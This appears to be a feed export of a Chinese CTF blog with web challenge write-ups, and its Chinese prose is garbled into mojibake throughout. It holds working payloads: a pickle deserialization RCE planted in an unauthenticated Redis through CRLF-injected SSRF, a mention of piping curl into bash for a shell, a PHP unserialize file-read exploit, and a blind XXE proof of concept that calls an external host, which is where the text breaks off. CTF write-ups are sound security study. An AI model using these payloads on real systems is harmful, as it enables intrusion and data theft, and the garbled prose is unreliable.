coding: utf-8 -*-from hashlib import md5# here put the import libclass User(object):    def __init__(self,email,username,password):        self.email = email        self.username = username        self.password = md5(password.encode(encoding=&#39;utf8&#39;)).hexdigest()        self.phone = None        self.qqnumber = None        self.intro = None    def verify_pass(self,password):        if password and md5(password.encode(encoding=&#39;utf8&#39;)).hexdigest() == self.password:            return True        return None    @staticmethod    def modify_info(obj,dict):        for key in dict:            if hasattr(obj,key) and dict[key]!=&#39;&#39;:                setattr(obj,key,dict[key])class Cookie(object):    __key = &quot;abcd&quot;    def __init__(self):        __key = &quot;abcd&quot;    @property    def create(self):        self.mix_str = (self.username+Cookie.__key).encode(encoding=&quot;utf8&quot;)        self.md5_str = self.username+md5(self.mix_str).hexdigest()        return self.md5_str    @create.setter    def create(self,username):        self.username = username    @staticmethod    def verify(verify_cookie):        if verify_cookie:            username = verify_cookie[:-32]            verify_str = verify_cookie[-32:]            return md5((username+Cookie.__key).encode(encoding=&quot;utf8&quot;)).hexdigest()==verify_str        return None</code></pre><p>è¿™é‡Œä¸»è¦å¾—åˆ°ä¸¤ä¸ªä¿¡æ¯ã€‚redisæ— å¯†ç ã€‚ä¸”æ˜¯ç”¨æ¥å­˜å‚¨cookieçš„ã€‚è€Œcookieçš„å€¼ä¼šè¢«è°ƒç”¨å‡ºæ¥è¿›è¡Œpickleçš„ååºåˆ—åŒ–ã€‚</p><p>ä¸ç”¨è¯´ï¼Œæˆ‘ä»¬ä¹Ÿå¤§è‡´æ˜ç™½æ€è·¯äº†ï¼šæ“ä½œredisä¿®æ”¹cookieé”®å¯¹åº”çš„å€¼ã€‚ç”¨cookieåˆ·æ–°è§¦å‘ååºåˆ—åŒ–RCEã€‚<br>è¿™ä¸ªè€ƒç‚¹åœ¨å»å¹´çš„swpuctfçš„web2ä¸­ä¹Ÿå‡ºç°è¿‡ã€‚å¯æƒœè‡ªå·±å› ä¸ºç¯å¢ƒé—®é¢˜ä¸€ç›´æ²¡èƒ½åœ¨buuä¸Šåšã€‚</p><p>è¿™é‡ŒåŸºäºæºç æ¯”è¾ƒé½å…¨ã€‚æˆ‘å°±æœ¬åœ°ç®€å•æ­å»ºäº†ä¸€ä¸ªserverã€‚ç„¶åè§¦å‘ä¸€ä¸ªç”Ÿæˆcookieå­˜å‚¨çš„è¿‡ç¨‹ã€‚çœ‹çœ‹å¤§è‡´çš„å­˜å‚¨è§„å¾‹<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å®é™…ä¸Šå°±æ˜¯ä»¥æˆ‘ä»¬çš„cookieä½œä¸ºé”®ï¼Œpickleçš„opcodeä½œä¸ºå€¼ï¼Œæ¯”flaskçš„é»˜è®¤å­˜å‚¨ç›´è§‚å¾ˆå¤šã€‚</p><p>é‚£ä¹ˆå¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬ç”Ÿæˆä¸‹RCEä»£ç </p><pre><code class="python">import pickleimport urllib.parseclass exp(object):    def __reduce__(self):        return (eval,(&quot;__import__(&#39;os&#39;).system(&#39;echo `ls /` &gt; /tmp/byc&#39;)&quot;,))a = exp()s=pickle.dumps(a)print(s)</code></pre><p>è¿™é‡Œä¸ºäº†ä¸ç»™æœåŠ¡å™¨å¸¦æ¥å›°æ‰°ï¼Œç›´æ¥æŠŠæ ¹ç›®å½•lsçš„ç»“æœå†™åˆ°tmpç›®å½•ä¸‹ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½ç”¨è¯»æ–‡ä»¶çš„é€”å¾„ç›´æ¥è¯»äº†ã€‚</p><p>å‘½ä»¤</p><pre><code>http://127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\x80\x03cbuiltins\neval\nq\x00X7\x00\x00\x00__import__(&#39;os&#39;).system(&#39;echo `ls /` &gt; /tmp/byc4&#39;)q\x01\x85q\x02Rq\x03.&quot;%0d%0apadding</code></pre><p>å¼€å§‹æˆ‘åœ¨æ‹…å¿ƒç¼–ç é—®é¢˜ã€‚åæ¥å‘ç°åº”è¯¥ä¸ç”¨åœ¨æ„ã€‚ç›´æ¥ç”¨python3çš„opcodeç»“æœå°±å¯ä»¥äº†ã€‚<br>åˆ·æ–°ä¸‹cookieå¯¹åº”é¡µé¢,ç„¶åè¯»æ–‡ä»¶<code>file:///tmp/byc4</code><br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥è¯»flagäº†ã€‚å½“ç„¶åé¢æˆ‘è¯•äº†ä¸‹ç›´æ¥ç”¨<code>curl xxx|bash</code>å¼¹ä¸ªshellä¹Ÿæ˜¯å¯ä»¥çš„ã€‚æ–¹æ³•æœ‰å¾ˆå¤šã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ä¸¤é“é¢˜éƒ½ç®—æ˜¯phpä¸redisä»¥åŠpythonä¸redisçš„ç»å…¸æ­é…äº†ã€‚å½“ç„¶redisçš„åˆ©ç”¨è¿˜æœ‰å¾ˆå¤šï¼Œä»¥åä¼šæ…¢æ…¢å­¦ä¹ ã€‚</p><p>ç„¶åRCTFé™©äº›çˆ†é›¶â€¦â€¦calcè¿™é¢˜çœŸçš„æ˜¯å¤ªè€ƒéªŒåŸºæœ¬åŠŸäº†ã€‚åšçš„äººå¿ƒç´¯ã€‚</p><p>æœ€åå°±è¦æ”¶å¿ƒå¥½å¥½å¤ä¹ äº†ã€‚è¿™å­¦æœŸå¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨äº†ctfä¸Šï¼Œè¯¾ä¸šä¸åƒä»¥å¾€é‚£æ ·å¿ƒé‡Œæœ‰åº•äº†ã€‚æ„Ÿè§‰å¾—å¥½å¥½å¤ä¹ ä¸€æŠŠã€‚ç°åœ¨CTFé©¬ä¸Šä¹Ÿå¿«æ‰“ä¸€å¹´äº†ï¼Œè‡ªå·±å¾ˆé«˜å…´æ°´å¹³æ¯”ä»¥å¾€è¦é«˜äº†ä¸å°‘ã€‚ä½†æ˜¯è‡ªå·±ä½œä¸ºx1cçš„webæ‰‹ï¼Œè¿˜æ˜¯æ„Ÿè§‰å®åŠ›è·Ÿåˆ«çš„å¼ºé˜Ÿç›¸æ¯”å·®äº†ä¸å°‘ã€‚å¸Œæœ›æš‘å‡èƒ½å¥½å¥½ç ”ç©¶ä¸‹è‡ªå·±æƒ³å­¦çš„ä¸œè¥¿,å°½é‡è¿‡çš„å……å®ç‚¹å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯-é’é¾™ç»„-WEB-writeup</title>
      <link href="2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/"/>
      <url>2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/</url>
      
        <content type="html"><![CDATA[<p>ç½‘é¼é’é¾™ç»„æˆåŠŸæŒºè¿›çº¿ä¸‹,å½“ç„¶è¦æ„Ÿè°¢é˜Ÿå‹ä»¬çš„ç»™åŠ›å‘æŒ¥,X1cä¸¤åªé˜Ÿä¹Ÿèƒ½æˆåŠŸä¼šå¸ˆåŠå†³èµ›äº†.(å°±æ˜¯å¯¹æˆ‘è¿™æ ·çš„awdå°ç™½è€Œè¨€ä¼°è®¡åˆæ˜¯å»å½“ç‚®ç°äº†)</p><p>è¯´ä¸‹æ¯”èµ›æ„Ÿå—å§ã€‚è€å®è¯´webæ‰‹æ¯”èµ›ä½“éªŒå¹¶ä¸å¥½ã€‚å¼€èµ›åˆ°12ç‚¹æ‰å‡ºç°ç¬¬ä¸€é“WEBé¢˜.è€Œè¿™ä¹‹å‰å”¯ä¸€ä¸€ä¸ªç­¾åˆ°é¶æœºé¢˜æˆ‘å¼€äº†ä¸€ä¸ªå°æ—¶éƒ½æ˜¯åçš„â€¦<br>ç„¶åæ˜¯æ¯”èµ›æ°›å›´,è€å®è¯´æ˜çœ¼äººåº”è¯¥éƒ½çœ‹å¾—å‡ºæ¥äº†ã€‚ä¸­é—´pyä»€ä¹ˆçš„å°±ä¸å¤šè¯´äº†ã€‚javaé‚£é¢˜æˆ‘çœ¼çççœ‹ç€5åˆ†é’Ÿå†…æ¶¨äº†å‡ åè§£ã€‚è‡³äºå…¶ä»–å‡ ä¸ªäºŒè¿›åˆ¶çš„é¢˜æ›´ä¸ç”¨æ,åšå‡ºæ¥çš„äººæ•°å°±æ˜¯é“è¯äº†ã€‚æœ€åäº”åˆ†é’Ÿå†…ï¼Œåå‡ ç§’æ—¶é—´æˆ‘ä»¬é˜Ÿæ‰äº†åå¤šåç„¶ååˆè¹¦å›æ¥äº†å°±å¾ˆè¿·ã€‚<br>ç„¶ååŠ¨æ€é¶æœºä¸€é˜Ÿåªèƒ½å¼€ä¸€ä¸ª,è€å®è¯´å¾ˆå¤§ç¨‹åº¦ä¸ŠæŸç¼šäº†å¼€é¢˜çš„èŠ‚å¥ã€‚</p><p>æ¯”èµ›éš¾åº¦å€’è¿˜èƒ½æ¥å—ã€‚æŒ‰éƒå¸ˆå‚…è¯´çš„,è¿™æ¬¡æ²¡ak webä¸å¤ªåº”è¯¥ã€‚å½“ç„¶å…¶å®æ˜¯æœ€åçœ‹ç€åªå‰©10å¤šåˆ†é’Ÿæ—¶åæ¬¡ç¨³äº†å°±åšä¸åŠ¨äº†.èµ›åå¤ç°æœ€åä¸€ä¸ªé¢˜æ—¶ä¹Ÿå‘ç°ç¡®å®ä¸æ”¹å®Œæ²¡åšå‡ºæ¥çš„ã€‚æ€»ä¹‹è¿™é‡ŒæŠŠæ‰€æœ‰WEBé¢˜è§£éƒ½è®°å½•ä¸‹å§ã€‚</p><a id="more"></a><h1 id="AreUserialize"><a href="#AreUserialize" class="headerlink" title="AreUserialize"></a>AreUserialize</h1><p>ä»Šæ—¥ç„å­¦é¢˜ã€‚é¦–å…ˆæ˜¯æºç </p><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler {    protected $op;    protected $filename;    protected $content;    function __construct() {        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();       }    public function process() {        if($this-&gt;op == &quot;1&quot;) {            $this-&gt;write();               } else if($this-&gt;op == &quot;2&quot;) {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output(&quot;Bad Hacker!&quot;);        }    }    private function write() {        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {            if(strlen((string)$this-&gt;content) &gt; 100) {                $this-&gt;output(&quot;Too long!&quot;);                die();            }            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        } else {            $this-&gt;output(&quot;Failed!&quot;);        }    }    private function read() {        $res = &quot;&quot;;        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;    }    private function output($s) {        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    }    function __destruct() {        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    }}function is_valid($s) {    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;}if(isset($_GET{&#39;str&#39;})) {    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) {        $obj = unserialize($str);    }}</code></pre><p>åŠŸèƒ½ä¸Šæœ‰ä¸€ä¸ªä»»æ„å†™è·Ÿä»»æ„è¯»ã€‚åªéœ€è¦è¿‡ä¸€ä¸ªvalidå‡½æ•°æ£€æŸ¥å°±èƒ½ååºåˆ—åŒ–ã€‚opçš„å€¼å†³å®šäº†è¯»/å†™åŠŸèƒ½ã€‚</p><p>é¦–å…ˆææ„å‡½æ•°æ˜æ˜¾æ˜¯å…¥æ‰‹ç‚¹ã€‚ä½†æ˜¯ä»–é™åˆ¶äº†å½“opä¸º<code>&quot;2&quot;</code>æ—¶ä»¤opä¸º<code>&quot;1&quot;</code>ä¹Ÿå°±æ˜¯å†™åŠŸèƒ½ã€‚ç„¶ååˆç½®å†…å®¹ä¸ºç©ºã€‚<br>è·Ÿè¿›åˆ°<code>process()</code>å‡½æ•°çœ‹ä¸‹,ä¼šæ˜æ˜¾çš„å‘ç°å®ƒé‡‡ç”¨äº†<code>$this-&gt;op == &quot;2&quot;</code>è¿™æ ·çš„å¼±ç±»å‹ç›¸ç­‰åˆ¤æ–­ã€‚<br>é‚£ä¹ˆæ¼æ´å¾ˆæ˜æ˜¾äº†,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡ææ„å‡½æ•°çš„é™åˆ¶,è¾¾æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>ä¸è¿‡æ³¨æ„çš„æ˜¯,åŸé¢˜çš„<code>Filehandler</code>ç±»å±æ€§éƒ½æ˜¯protected,è¡¨ç°å‡ºæ¥çš„ç»“æœå°±æ˜¯åºåˆ—åŒ–æ•°æ®æœ‰ç©ºå­—ç¬¦ã€‚è€Œè¿™æ˜¯è¿‡ä¸äº†<code>is_valid()</code>çš„æ£€æŸ¥çš„</p><p>ä½†æ˜¯ä¸è¦ç´§ã€‚php7.2+ç‰ˆæœ¬ä¸‹ååºåˆ—åŒ–å¹¶ä¸åœ¨ä¹ä½ ä¼ å…¥çš„æ•°æ®å±æ€§æ˜¯å¦æ˜¯protectedã€‚æ‰€ä»¥æˆ‘ä»¬æ”¹æˆpublicå³å¯ã€‚</p><pre><code class="php">&lt;?phpclass FileHandler {    public $op = 2;    public $filename = &quot;file:///web/html/flag.php&quot;;}$o = new FileHandler();echo urlencode(serialize($o));</code></pre><p><code>2==&quot;2&quot;,&quot;2e0&quot;==&quot;2&quot;</code>è¿™ç§æŠ€å·§ä¸ç”¨å¤šè¯´äº†ã€‚è¿™é‡Œè¦è§£é‡Šçš„æ˜¯æ¯”è¾ƒå‘çš„åé¢çš„filenameã€‚å¼€å§‹ç›´æ¥ä¼ªåè®®è¯»flag.phpè¯»ä¸åˆ°ã€‚è¿™ä¸ªä»æºç è§’åº¦è®²å®Œå…¨æ²¡é“ç†ã€‚<br>ç„¶ååªèƒ½å°è¯•ç”¨ç»å¯¹è·¯å¾„è¯»äº†ã€‚åŸºäºæˆ‘ä»¬å…¶ä»–æ–‡ä»¶éƒ½èƒ½è½»æ¾è¯»åˆ°,æˆ‘ä»¬å…ˆæ„é€ ä¸ª404çœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆæœåŠ¡å™¨ã€‚<br>å‘ç°æ˜¯ Alpineçš„é•œåƒã€‚<br>äºæ˜¯æŸ¥äº†æ³¢å…¶webè·¯å¾„çš„é…ç½®/web/config/httpd.conf<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/1.png" class="lazyload" data-srcset="1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åå¾—åˆ°webè·¯å¾„åæ¢ç»å¯¹è·¯å¾„å°±è¯»åˆ°äº†ï¼Œç„å­¦é—®é¢˜ã€‚<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/2.png" class="lazyload" data-srcset="2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>psï¼š<br>èµ›åçªç„¶æƒ³èµ·æ¥åŸæ¥åœ¨åšD^3æ—¶è¸©è¿‡çš„ä¸€ä¸ªå‘ã€‚å°±æ˜¯apacheçš„ææ„å‡½æ•°æ‰§è¡Œæ—¶å·¥ä½œç›®å½•å¯èƒ½ä¼šå˜ã€‚æ‰€ä»¥ç”¨ç›¸å¯¹è·¯å¾„è¯»æ—¶æ˜¯è·å–ä¸åˆ°flag.phpçš„.å½“ç„¶è¿™æ˜¯æ¦‚ç‡é—®é¢˜ã€æœ‰çš„äººå°±èƒ½ç›´æ¥è¯»åˆ°ã€‚</p><h1 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h1><p>è¿™é¢˜èƒ½å‡º200è§£æˆ‘æ˜¯çœŸæ²¡æƒ³åˆ°çš„,ä¸»è¦ä¸­é—´é‚£æ³¢å‚ç›´ä¸Šåˆ†å¤ªçªå…€äº†ã€‚ä½†ä»”ç»†æƒ³æˆ‘ä¹Ÿæ˜¯é‚£ä¸ªæ—¶é—´äº¤çš„flagâ€¦</p><p>å½“ç„¶é¢˜ç›®è‚¯å®šæ˜¯ç®€å•é¢˜ã€‚é¦–å…ˆè¿›å»æœ‰ä¸€ä¸ªæˆ‘å¼€å§‹å¿½ç•¥çš„ä¿¡æ¯å°±æ˜¯å®ƒåœ¨uploadç•Œé¢æç¤ºflagåœ¨/flagã€ç„¶åéšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶,é©¬ä¸Šå°±æµ‹å‡ºæ˜¯ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½</p><p>é‚£è€å¥—è·¯å…ˆä»<code>/WEB-INF/web.xml</code>å¼€å§‹</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;  &lt;display-name&gt;file_in_java&lt;/display-name&gt;  &lt;welcome-file-list&gt;    &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt;  &lt;/welcome-file-list&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;UploadServlet&lt;/display-name&gt;    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;ListFileServlet&lt;/display-name&gt;    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;DownloadServlet&lt;/display-name&gt;    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><p>ä¸‰ä¸ªServlet,è·¯å¾„ä¹Ÿéƒ½ç»™å‡ºæ¥äº†ï¼Œä¸€ä¸ªä¸ªè¯»ç„¶ååç¼–è¯‘å§ã€‚</p><p>è¿™é‡Œç›´æ¥ç»™å‡ºå«æœ‰å…³é”®ä»£ç çš„java<br>UploadServlet.java</p><pre><code class="java">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name:   UploadServlet.javapackage cn.abc.servlet;import java.io.*;import java.util.*;import javax.servlet.*;import javax.servlet.http.*;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.FileUploadException;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import org.apache.commons.fileupload.servlet.ServletFileUpload;import org.apache.poi.openxml4j.exceptions.InvalidFormatException;import org.apache.poi.ss.usermodel.*;public class UploadServlet extends HttpServlet{    public UploadServlet()    {    }    protected void doGet(HttpServletRequest request, HttpServletResponse response)        throws ServletException, IOException    {        doPost(request, response);    }    protected void doPost(HttpServletRequest request, HttpServletResponse response)        throws ServletException, IOException    {        String savePath;        File tempFile;        String message;        savePath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);        String tempPath = getServletContext().getRealPath(&quot;/WEB-INF/temp&quot;);        tempFile = new File(tempPath);        if(!tempFile.exists())            tempFile.mkdir();        message = &quot;&quot;;        ServletFileUpload upload;        DiskFileItemFactory factory = new DiskFileItemFactory();        factory.setSizeThreshold(0x19000);        factory.setRepository(tempFile);        upload = new ServletFileUpload(factory);        upload.setProgressListener(new  Object()     /* anonymous class not found */    class _anm1 {});        upload.setHeaderEncoding(&quot;UTF-8&quot;);        upload.setFileSizeMax(0x100000L);        upload.setSizeMax(0xa00000L);        if(!ServletFileUpload.isMultipartContent(request))            return;        try        {            List list = upload.parseRequest(request);            Iterator iterator = list.iterator();            do            {                if(!iterator.hasNext())                    break;                FileItem fileItem = (FileItem)iterator.next();                if(fileItem.isFormField())                {                    String name = fileItem.getFieldName();                    String s = fileItem.getString(&quot;UTF-8&quot;);                } else                {                    String filename = fileItem.getName();                    if(filename != null &amp;&amp; !filename.trim().equals(&quot;&quot;))                    {                        String fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1);                        InputStream in = fileItem.getInputStream();                        if(filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName))                            try                            {                                Workbook wb1 = WorkbookFactory.create(in);                                Sheet sheet = wb1.getSheetAt(0);                                System.out.println(sheet.getFirstRowNum());                            }                            catch(InvalidFormatException e)                            {                                System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);                                e.printStackTrace();                            }                        String saveFilename = makeFileName(filename);                        request.setAttribute(&quot;saveFilename&quot;, saveFilename);                        request.setAttribute(&quot;filename&quot;, filename);                        String realSavePath = makePath(saveFilename, savePath);                        FileOutputStream out = new FileOutputStream((new StringBuilder()).append(realSavePath).append(&quot;/&quot;).append(saveFilename).toString());                        byte buffer[] = new byte[1024];                        for(int len = 0; (len = in.read(buffer)) &gt; 0;)                            out.write(buffer, 0, len);                        in.close();                        out.close();                        message = &quot;\u6587\u4EF6\u4E0A\u4F20\u6210\u529F!&quot;;                    }                }            } while(true);        }        catch(FileUploadException e)        {            e.printStackTrace();        }        request.setAttribute(&quot;message&quot;, message);        request.getRequestDispatcher(&quot;/ListFileServlet&quot;).forward(request, response);        return;    }    private String makeFileName(String filename)    {        return (new StringBuilder()).append(UUID.randomUUID().toString()).append(&quot;_&quot;).append(filename).toString();    }    private String makePath(String filename, String savePath)    {        int hashCode = filename.hashCode();        int dir1 = hashCode &amp; 0xf;        int dir2 = (hashCode &amp; 0xf0) &gt;&gt; 4;        String dir = (new StringBuilder()).append(savePath).append(&quot;/&quot;).append(dir1).append(&quot;/&quot;).append(dir2).toString();        File file = new File(dir);        if(!file.exists())            file.mkdirs();        return dir;    }    private static final long serialVersionUID = 1L;}</code></pre><p>å®è¯è¯´,ç¬¬ä¸€æ­¥è¯»å®Œåçœ‹äº†çœ¼æ‰€æœ‰çš„æºç ã€‚æ²¡çœ‹å‡ºä»€ä¹ˆç«¯å€ªã€‚(å…¶å®æ˜¯çœ‹æ¼äº†)<br>ç¬¬ä¸€æƒ³æ³•æ˜¯å¹½çµçŒ«ã€‚ä½†æ˜¯é—®äº†ä¸‹é˜Ÿå‹è¯´8009ç«¯å£ä¸æ˜¯å¼€çš„å°±ä½œç½¢ã€‚<br>ç„¶åæƒ³åˆ©ç”¨åˆšåˆšçš„ä»»æ„æ–‡ä»¶ä¸‹è½½è¯»flag.å´å‘ç°è¢«å®šä½åˆ°404äº†ã€‚ä»”ç»†çœ‹æºç ä¼šå‘ç°<br>DownloadServlet.java</p><pre><code class="java"> if(fileName != null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;))        {            request.setAttribute(&quot;message&quot;, &quot;\u7981\u6B62\u8BFB\u53D6&quot;);            request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);            return;        }</code></pre><p>æœç„¶è¿‡æ»¤äº†å…³é”®å­—ã€‚éœ€è¦å…¶ä»–æ–¹æ³•è¯»flag.</p><p>æ­¤æ—¶å›è¿‡å¤´å‘ç°uploadservletæœ‰ä¸€æ®µçªå…€çš„æºç </p><pre><code class="java">if(filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName))    try    {        Workbook wb1 = WorkbookFactory.create(in);        Sheet sheet = wb1.getSheetAt(0);        System.out.println(sheet.getFirstRowNum());    }    catch(InvalidFormatException e)    {        System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);        e.printStackTrace();    }</code></pre><p>æˆ‘ç¬¬ä¸€æƒ³æ³•æ˜¯æƒ³åˆ°ä¹‹å‰æ›¾ç»çœ‹è¿‡ä½†æ²¡åšè¿‡çš„swpuctf web5.é‚£é“é¢˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§è¿‡èƒ½ç”¨xlsxæ‰“xxeçš„ç±»å‹ã€‚è€Œå®ƒç”¨åˆ°çš„å°±æ˜¯ä¸€ä¸ªå¾ˆè€çš„cve,CVE-2014-3529.</p><p>è€Œè¿™éƒ¨åˆ†ä»£ç é€»è¾‘è¡¨ç¤ºï¼Œå¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶åæ˜¯excel-å¼€å§‹åŠ ä¸Š.xlsxç»“å°¾ï¼Œå°±ä¼šç”¨poiè§£æxlsxã€‚è€Œè¿™ä¸ªCVEçš„poiç‰ˆæœ¬æ°å¥½æ˜¯<code>poi-ooxml-3.10</code></p><p>é‚£å°±ä¸ç”¨è¯´äº†,å…ˆè¯•ç€æŒ‰æµç¨‹æ„é€ ä¸‹payloadã€‚<br>æ³¨æ„,è¿™é‡Œæ„é€ payloadæ—¶æœ€å¥½åœ¨zipä¸­æ‰“å¼€æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„<code>[Content-Types].xml</code>ã€‚å¦åˆ™å¯èƒ½ä¼šå‡ºé”™ã€‚è¿™æ˜¯æˆ‘å¬åŒå­¦è¯´æ‰çŸ¥é“æœ‰è¿™ç§ç„å­¦é—®é¢˜ã€‚æˆ‘ä¸ªäººæ˜¯å…ˆå°†xlsxæ”¹ä¸ºzip,ç„¶åwinrarç›´æ¥æ‰“å¼€ä¿®æ”¹xmlçš„pocã€‚æœ€åå†æ”¹å›æ¥ã€‚è¿™æ ·åº”è¯¥å°±æ²¡å•¥é—®é¢˜äº†ã€‚</p><p>å‘ç°vpsèƒ½æ”¶åˆ°è¯·æ±‚ã€‚é‚£å°±ç›´æ¥xxeç›²æ‰“ä¸€æŠŠæ¢­äº†ã€‚<br>poc</p><pre><code class="xml">&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM &quot;http://xxxxxx/1.xml&quot;&gt;%int;%all;%send;]&gt;</code></pre><p>vpsä¸Šçš„1.xml</p><pre><code class="xml">&lt;!ENTITY % 